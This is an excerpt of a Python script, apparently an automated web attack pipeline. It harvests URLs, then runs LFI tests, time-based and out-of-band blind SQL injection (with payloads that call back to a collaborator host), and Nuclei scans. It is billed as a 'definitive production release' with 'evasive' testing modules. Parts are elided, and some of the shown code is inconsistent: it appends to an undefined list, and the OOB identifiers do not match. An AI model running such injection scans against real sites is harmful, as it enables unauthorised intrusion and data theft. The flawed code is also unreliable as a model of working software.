#!/usr/bin/env python3
"""
P1-URLs.py - v1.8.2 Definitive Production Release
...
methodology and advanced, evasive vulnerability testing modules.
"""
...
def _check_sqli_vulnerability_time(target_url, method, headers):
    try:
        ...
        return True, time.time() - (start_attack if 'start_attack' in locals() else time.time())
    ...
    for url in urls:
        for param, values in parse_qs(urlparse(url).query, keep_blank_values=True).items():
            for db, payloads in CANARY_SQLI_PAYLOADS.items():
                payload = payloads[0].format(delay=TIME_DELAY, val=(values[0] if values else "")); probe_test_cases.extend([ (url, "GET", payload, "Parameter", param, db), (url, "GET", payload, "Parameter-HPP", param, db) ])
        for header in HEADERS_TO_TEST:
            for db, payloads in CANARY_SQLI_PAYLOADS.items():
                payload = payloads[0].format(delay=TIME_DELAY, val=""); probe_test_cases.append((url, "GET", payload, "Header", header, db))
        ...
        for future in as_completed(futures):
            if result := future.result():
                ...
                if candidate_key not in full_attack_map:
                    console.print(f"[bold yellow][!] Potential Candidate Found:[/] {result['details']['Injection Point']} on {result['url']}"); full_attack_map[candidate_key] = result['db']

    if not full_attack_map: console.print("[green][✔] No promising SQLi candidates found. Scan complete.[/green]"); return
    console.print(f"\n[bold bright_blue][*] Probe complete. Found {len(full_attack_map)} promising candidates. Launching full exhaustive scan...[/]")
    
    full_attack_cases = []
    for key, db_type in full_attack_map.items():
        injection_point, url = key.split('@'); point_type, point_name = injection_point.split(': ')
        # Add Time-Based Full Scan
        for payload_template in BLIND_SQLI_PAYLOADS.get(db_type, []):
            if point_type == "Header":
                for method in METHODS_TO_TEST: full_attack_cases.append((url, method, payload_template.format(delay=TIME_DELAY, val=""), "Header", point_name, db_type))
            else: full_attack_cases.extend([(url, "GET", payload_template.format(delay=TIME_DELAY, val=""), "Parameter", point_name, db_type), (url, "GET", payload_template.format(delay=TIME_DELAY, val=""), "Parameter-HPP", point_name, db_type)])
        # Add OOB Full Scan
        if collab_host and db_type in OOB_SQLI_PAYLOADS:
            for payload_template in OOB_SQLI_PAYLOADS[db_type]:
                oob_id, payload = generate_oob_id(), payload_template.format(oob_id=generate_oob_id(), collab_url=collab_host, val="")
                if point_type == "Header":
                    for method in METHODS_TO_TEST: full_attack_cases.append((url, method, payload, "Header", point_name, db_type, "OOB", oob_id, oob_log_file))
                else: all_test_cases.extend([(url, "GET", payload, "Parameter", point_name, db_type, "OOB", oob_id, oob_log_file), (url, "GET", payload, "Parameter-HPP", point_name, db_type, "OOB", oob_id, oob_log_file)])
...
def main():
    ...
    if args.use_urls:
        workflow = [("Deduplicating URLs...", lambda: run_uro(str(input_file), deduped_urls_path)), ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)),
        ...
        workflow = [("Gathering URLs...", lambda: gather_urls(str(input_file), output_dir/BULK_URLS_OUTPUT)), ("Deduplicating URLs...", lambda: run_uro(output_dir/BULK_URLS_OUTPUT, deduped_urls_path)),
                    ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)), ("LFI Analysis...", lambda: test_lfi_dynamically(gf_dir/f"{basefile}_lfi.txt", args, lfi_file)),
                    ("Blind SQLi Analysis...", lambda: test_blind_sqli(gf_dir/f"{basefile}_sqli.txt", sqli_file, oob_file, args)),
                    ("Nuclei Scanning...", lambda: run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_file))]
